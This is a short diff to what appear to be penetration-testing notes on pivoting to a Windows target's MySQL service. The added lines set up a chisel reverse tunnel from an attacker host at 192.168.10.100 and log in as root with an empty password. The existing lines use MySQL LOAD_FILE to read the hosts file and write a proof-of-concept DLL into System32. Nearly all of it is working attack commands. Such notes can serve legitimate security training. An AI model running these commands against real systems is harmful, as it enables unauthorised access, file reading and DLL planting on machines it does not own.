@@ -745,7 +745,13 @@ additional use
 port forwarding to access MySQL
 
 ```mysql
+/* attacker */
+./chisel server -p 4547 --reverse -v
+/* target */
+.\chisel.exe client 192.168.10.100:4547 R:4748:localhost:3306
+
 /* MySQL */
+mysql -h 127.0.0.1 -u root -p '' -P 4748
 SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts') AS Result;
 SELECT LOAD_FILE('C:\\Users\\Public\\Documents\\poc.dll') INTO DUMPFILE "C:\\Windows\\System32\\poc.dll";
 ```
